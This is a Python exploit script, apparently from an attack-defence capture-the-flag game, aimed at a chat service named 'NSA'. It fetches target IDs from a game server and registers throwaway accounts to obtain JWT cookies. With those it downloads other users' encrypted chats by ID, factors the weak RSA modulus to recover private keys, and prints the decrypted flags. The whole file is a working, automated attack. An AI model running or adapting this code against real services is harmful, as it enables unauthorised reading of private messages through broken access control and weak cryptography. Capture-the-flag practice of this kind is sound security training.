#!/usr/bin/env python3
from pwn import *
import re
import sys
import time
import requests
import json
import uuid
from sympy import factorint, mod_inverse
import base64

GAME_URL = "http://10.41.251.2/attack.json"
TEAM_IP = sys.argv[1]
TEAM_ID = TEAM_IP.split(".")[2]
SERVICE = "NSA"
ATTACKER_HOST = "10.41.35.62"

def getFlagStorages():
    while True:
        try:
            r = requests.get(GAME_URL)
            resp_json = r.json()
            storages = resp_json["attack_info"][SERVICE][TEAM_IP]
            return [id_val for round_dict in storages.values() for id_val in round_dict.values() if id_val is not None]
        except:
            time.sleep(0.5)
            continue

def factor_rsa_modulus(n):
    """Factor the RSA modulus n into p and q"""
    factors = factorint(n)
    primes = list(factors.keys())
    if len(primes) == 2:
        return primes[0], primes[1]
    return None, None

def recover_private_key(public_key):
    """Recover private key from weak public key"""
    e, n = public_key
    
    # Factor n since it's small
    p, q = factor_rsa_modulus(n)
    if not p or not q:
        return None
    
    # Calculate phi(n)
    phi_n = (p - 1) * (q - 1)
    
    # Calculate private exponent d
    d = mod_inverse(e, phi_n)
    
    return (d, n)

def decrypt_chat(ciphertext, private_key):
    """Decrypt the chat using recovered private key"""
    d, n = private_key
    
    # Ensure ciphertext is a list
    if isinstance(ciphertext, str):
        ciphertext = json.loads(ciphertext)
    
    # Decrypt each character
    plaintext = ""
    for char in ciphertext:
        plaintext += chr(pow(char, d, n))
    
    return plaintext

storages = getFlagStorages()
target_host = f"http://{TEAM_IP}:1337"

for storage in storages:
    try:
        dummy_username = f"attacker_{uuid.uuid4().hex[:8]}"
        password = "test12346714578123478812345"
        
        # 1. Register account
        register_data = {
            "username": dummy_username,
            "firstname": "test",
            "lastname": "test",
            "email": f"{dummy_username}@test.com",
            "password": password,
            "biometricFingerprint": "a779caabfbf3a931ed6b2f3bf3e517b2",
            "profile-picture": ""
        }
        
        response = requests.post(f"{target_host}/register", data=register_data, timeout=5)
    
        
        # 2. Login to get JWT token
        login_data = {
            "username": dummy_username,
            "password": password
        }
        
        session = requests.Session()
        response = session.post(f"{target_host}/", data=login_data, timeout=5, allow_redirects=False)
        
        # Get the JWT cookie
        jwt_cookie = session.cookies.get("NSA_JWT")
        if not jwt_cookie:
            continue
        
        # 3. Download the encrypted chat using the storage ID (chat_id)
        headers = {"Cookie": f"NSA_JWT={jwt_cookie}"}
        response = requests.get(
            f"{target_host}/api/v1/download-chat?chat_id={storage}",
            headers=headers,
            timeout=5
        )
        
        chat_data = response.json()
        
        # 4. Extract encrypted data and public key
        encrypted_chat = chat_data["data"]["chat_data"]
        
        # Check if we got decrypted data (if we're admin or owner)
        if isinstance(encrypted_chat, str) and not encrypted_chat.startswith("["):
            # Already decrypted
            plaintext = encrypted_chat
        else:
            # Need to decrypt
            if "public_key" not in chat_data["data"]:
                continue
            
            public_key = chat_data["data"]["public_key"]
            
            # Public key should be a tuple (e, n)
            if isinstance(public_key, list):
                public_key = tuple(public_key)
            
            # 5. Recover private key from weak RSA
            private_key = recover_private_key(public_key)
            
            if not private_key:
                continue
            
            # 6. Decrypt the chat
            if isinstance(encrypted_chat, str):
                encrypted_chat = json.loads(encrypted_chat)
            
            plaintext = decrypt_chat(encrypted_chat, private_key)
        
        # 7. Extract flag from plaintext
        print(plaintext)

    except Exception as e:
        continue